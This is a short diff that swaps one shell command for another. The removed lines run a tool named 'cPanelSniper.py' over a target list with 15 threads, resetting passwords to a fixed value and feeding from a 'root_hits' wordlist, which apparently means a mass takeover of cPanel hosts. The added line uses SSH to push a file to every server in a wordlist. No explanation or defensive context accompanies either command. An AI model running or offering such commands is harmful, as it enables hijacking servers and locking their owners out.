@@ -1,3 +1,1 @@
-python3 cPanelSniper.py -l list.txt -t 15 \
-  --action passwd --passwd 'P@ss2026Fikri' \
-  --passwd-append-wordlist root_hits.txt
+python ssh_list_domains.py --wordlist servers.txt --deploy-to-all --filename ads.txt --content-file ads.txt
